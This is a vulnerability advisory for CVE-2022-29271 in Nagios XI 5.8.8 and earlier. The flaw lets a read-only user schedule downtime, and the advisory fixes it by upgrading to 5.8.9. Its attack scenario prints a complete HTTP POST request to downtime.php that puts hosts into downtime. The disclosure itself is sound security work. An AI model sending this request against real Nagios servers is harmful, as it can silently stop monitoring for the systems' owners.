An issue was discovered in Nagios XI 5.8.8 or earlier.

### Vulnerability: 
Read-only nagios user is able to schedule downtime

### Description:
A bug in Nagios XI 5.8.8 exists that allows a read-only user to schedule downtime. An attacker could exploit this vulnerability to e.g. permanently schedule all hosts into downtime, effectively stopping Nagios monitoring.

### Attack Scenario:
1. Log in as an read-only user
2. Send the following HTTP POST request as de read-only user (replace the cookie values with the ones of the current session):

POST /nagiosxi/includes/components/xicore/downtime.php?cmd=submit HTTP/1.1
Host: nagiosxi.demos.nagios.com
Cookie: __utmz=11341611.1649440044.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utma=11341611.45172755.1649440044.1649766250.1649878654.4; __utmc=11341611; __utmt=1; nagiosxi=2bd5iv500tlsc6sohfbichnk11; __utmb=11341611.19.10.1649878654
Content-Length: 213
Cache-Control: no-transform
Upgrade-Insecure-Requests: 1
Origin: https://nagiosxi.demos.nagios.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

type=host&hosts%5B%5D=secure.nagios.com&com_author=Example+User&com_data=test&trigger=0&fixed=1&hours=2&minutes=0&start_time=2022-04-13+14%3A38%3A45&end_time=2022-04-13+16%3A38%3A45&childoptions=0&serviceoptions=0

### Mitigation:
To mitigate this vulnerability, update Nagios to version 5.8.9 or later. See also https://www.nagios.com/downloads/nagios-xi/change-log/

CVE-ID: CVE-2022-29271
